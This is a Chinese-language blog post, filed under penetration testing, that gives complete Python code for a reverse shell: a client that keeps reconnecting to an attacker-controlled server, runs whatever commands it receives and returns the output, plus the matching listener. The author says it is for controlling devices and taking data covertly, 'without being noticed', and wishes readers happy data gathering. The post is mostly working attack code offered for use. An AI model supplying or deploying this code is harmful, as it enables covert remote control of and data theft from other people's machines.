---
title: 基于python的反向连接
category: 关于渗透的那些事
top: 50
updatedAt: 2024-03-16T12:13:51.623Z
createdAt: 2024-03-16T10:47:23.748Z
---

# 基于python的反向连接


- 基于python的反向shell 本人纯纯小白，为了数据写了个这个。
- 众所周知，我们想要控制一台没有公网的设备只能通过某些软件和frp等服务把它串出去，所以写了个服务，用于在不知不觉中远程控制和传输数据。
- 如有能力可以在[github](https://github.com/xrb114/-python-shell)（直接点击）上帮我点个star，谢谢，祝您数据获取愉快。


如下是客户端代码（需要在受控机上运行）


```python
import os
import socket
import time

HOST = '你自己服务器的ip或者域名' 
PORT = '这里改成你传输的端口，要和服务端端口一致'

while True:
    # 创建 socket 对象
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            connected = True
        except ConnectionRefusedError:
            connected = False
            print("连接拒绝，无法连接到服务器。")

        while connected:
            try:
                # 接收数据
                data = s.recv(1024).decode()
                print("接收到的数据：", data)

                if not data:
                    # 数据为空，表示连接断开
                    connected = False
                    break
                
                result = os.popen(data).read()
                print("执行结果：", result)
                message = result
                if message:
                    # 发送字符串给服务器
                    s.sendall(message.encode())
                    
                else:
                    ret = '返回值为空'
                    s.sendall(ret.encode())
                    
            except ConnectionResetError:
                print("连接重置，连接已断开。")
                connected = False
                break

        if not connected:
            print("连接断开，重新尝试连接...")
            time.sleep(5)  # 延迟5秒后进行下一次连接尝试

print("客户端运行结束。")
```

<!-- more -->

如下是服务端代码（在你的有公网的服务器上运行）
```python

import socket

HOST = ''
PORT = '这里改成你传输的端口，要和客户端端口一致'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)

    print("等待连接...")
    conn, addr = s.accept()
    print("连接已建立：", addr)
    
    # 发送数据到客户端
    while True:
        data = input('请输入要发送给客户端的数据（输入"quit"退出）：')
        
        if data == "quit":
            break
       

        conn.sendall(data.encode())
        received_data = conn.recv(1024).decode()
        print("接收到的数据：", received_data)

print("服务器运行结束。")
```